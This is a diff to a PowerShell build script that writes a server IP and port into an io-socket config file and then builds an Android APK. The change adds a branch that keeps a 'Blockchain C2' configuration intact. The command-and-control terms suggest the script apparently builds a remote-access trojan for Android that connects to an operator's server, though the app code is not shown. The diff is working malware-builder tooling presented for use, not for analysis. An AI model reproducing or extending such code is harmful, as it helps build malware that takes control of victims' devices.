@@ -31,14 +31,18 @@ if (-not $ioSocketFile) {
     exit 1
 }
 
-# Update IP and Port
-Write-Host "[->] Updating server configuration..." -ForegroundColor Yellow
+# Update IP and Port (skip if blockchain mode is configured)
 $content = Get-Content $ioSocketFile -Raw
-$pattern = "http://[^`"]+:\d+"
-$replacement = "http://$($IP):$Port"
-$content = $content -replace $pattern, $replacement
-Set-Content $ioSocketFile -Value $content -NoNewline
-Write-Host "[OK] Configuration updated" -ForegroundColor Green
+if ($content -match "BLOCKCHAIN_C2_CONFIG:") {
+    Write-Host "[SKIP] Blockchain C2 mode detected - preserving blockchain config" -ForegroundColor Cyan
+} else {
+    Write-Host "[->] Updating server configuration..." -ForegroundColor Yellow
+    $pattern = "http://[^`"]+:\d+"
+    $replacement = "http://$($IP):$Port"
+    $content = $content -replace $pattern, $replacement
+    Set-Content $ioSocketFile -Value $content -NoNewline
+    Write-Host "[OK] Configuration updated" -ForegroundColor Green
+}
 
 # Build APK
 Write-Host "[->] Building APK..." -ForegroundColor Yellow
